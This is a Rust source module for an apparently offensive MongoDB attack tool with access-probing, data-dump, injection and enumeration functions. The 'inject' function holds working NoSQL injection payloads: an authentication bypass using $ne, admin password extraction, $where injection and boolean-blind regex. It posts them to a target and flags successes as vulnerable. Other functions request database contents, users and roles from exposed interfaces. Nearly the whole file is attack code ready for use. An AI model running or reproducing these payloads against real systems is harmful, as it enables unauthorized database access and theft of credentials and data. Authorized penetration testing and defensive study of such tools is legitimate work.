use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

pub async fn access(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} MongoDB Unauthorized Access", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).send().await?;
    let status = resp.status().as_u16();
    let body = resp.text().await.unwrap_or_default();

    if status == 200 && (body.contains("mongo") || body.contains("MongoDB") || body.contains("It looks like you are trying to access MongoDB over HTTP")) {
        println!("  {} MongoDB HTTP interface exposed!", "[!]".red().bold());
    }

    let endpoints = ["/", "/admin", "/test", "/config"];
    for ep in &endpoints {
        let target = format!("{}{}", url.trim_end_matches('/'), ep);
        if let Ok(r) = client.get(&target).send().await {
            let s = r.status().as_u16();
            let text = r.text().await.unwrap_or_default();
            if s == 200 && !text.is_empty() {
                println!("  {} {:15} — {} bytes", "[+]".green().bold(), ep, text.len());
            }
        }
    }

    Ok(())
}

pub async fn dump(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} MongoDB Data Dump", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let dbs = ["admin", "config", "local", "test"];
    for db in &dbs {
        let target = format!("{}/{}/", url.trim_end_matches('/'), db);
        match client.get(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && !text.is_empty() {
                    println!("  {} Database {:10} — {} bytes", "[+]".green().bold(), db, text.len());
                    if text.contains("collection") || text.contains("document") {
                        println!("    {} Data exposed in database", "[!]".red().bold());
                    }
                }
            }
            Err(_) => println!("  {} Database {:10} — error", "[-]".dimmed(), db),
        }
    }

    Ok(())
}

pub async fn inject(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} MongoDB Injection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let payloads = [
        ("Auth bypass", r#"{"username":{"$ne":null},"password":{"$ne":null}}"#),
        ("Admin extract", r#"{"username":"admin","password":{"$gt":""}}"#),
        ("Regex DoS", r#"{"username":{"$regex":".*"},"password":{"$regex":".*"}}"#),
        ("Where injection", r#"{"$where":"this.username == 'admin' && this.password != ''}"#),
        ("Boolean blind", r#"{"username":{"$eq":"admin"},"password":{"$regex":"^a"}}"#),
    ];

    for (name, payload) in &payloads {
        match client.post(url).header("Content-Type", "application/json").body(*payload).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                let success = status == 200 && (text.contains("ok") || text.contains("success") || text.contains("token"));
                let tag = if success { "VULNERABLE".red().bold().to_string() } else { format!("status={}", status) };
                println!("  {} {:20} — {}", "*".cyan(), name, tag);
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn enumerate(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} MongoDB Enumeration", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let enum_endpoints = [
        ("Server status", "/serverStatus"),
        ("List databases", "/listDatabases"),
        ("Build info", "/buildInfo"),
        ("Host info", "/hostInfo"),
        ("Users", "/users"),
        ("Roles", "/roles"),
    ];

    for (name, ep) in &enum_endpoints {
        let target = format!("{}{}", url.trim_end_matches('/'), ep);
        match client.get(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && !text.is_empty() {
                    println!("  {} {:20} — {} bytes", "[+]".green().bold(), name, text.len());
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}
